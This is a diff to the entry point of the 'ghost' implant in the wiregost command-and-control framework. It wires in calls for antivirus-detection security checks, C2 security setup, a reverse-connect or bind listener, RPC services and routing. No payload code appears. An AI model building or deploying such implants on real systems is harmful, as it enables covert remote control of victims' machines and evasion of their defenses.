@@ -2,14 +2,19 @@ package main
 
 import (
 	"github.com/maxlandon/wiregost/ghost/assets"
+	"github.com/maxlandon/wiregost/ghost/c2"
+	"github.com/maxlandon/wiregost/ghost/c2/route"
 	"github.com/maxlandon/wiregost/ghost/core/generic/channels"
-	"github.com/maxlandon/wiregost/ghost/core/generic/evasion"
 	"github.com/maxlandon/wiregost/ghost/core/generic/info"
 	"github.com/maxlandon/wiregost/ghost/log"
 	"github.com/maxlandon/wiregost/ghost/profile"
+	"github.com/maxlandon/wiregost/ghost/rpc"
+	"github.com/maxlandon/wiregost/ghost/security"
 )
 
 func main() {
+
+	// Core Settings & Security -----------------------------------------------------------------
 
 	// Gather and check all compile-time variables/configuration
 	assets.SetupImplantAssets()
@@ -20,14 +25,8 @@ func main() {
 	// Implant concurrency management.
 	channels.SetupChannels()
 
-	// Security ----------------------------------------------------------------------------------
-
 	// Various Security checks (antivirus software running, etc)
-	evasion.SetupSecurity()
-
-	// Check/set limits
-
-	// Information -------------------------------------------------------------------------------
+	security.SetupSecurity()
 
 	// Ghost info, networks available, users connected, env variables
 	// Permissions, Owner, OS details, OS specific information.
@@ -38,13 +37,17 @@ func main() {
 	// Set network security & credentials
 	// Authorisations to connect to listener, fake front pages/redirections
 	// credentials, certificates, etc...
+	c2.SetupSecurity()
 
 	// Reverse connect or bind listener (goroutine, + send information)
+	c2.InitGhostComms()
 
 	// Register RPC services if listener
+	rpc.InitGhostRPC()
 
 	// Open routes given by server. Check all security details (fake pages,
 	// credentials and authorisations.)
+	route.InitRouting()
 
 	// OS-Specific -----------------------------------------------------------------------------
 
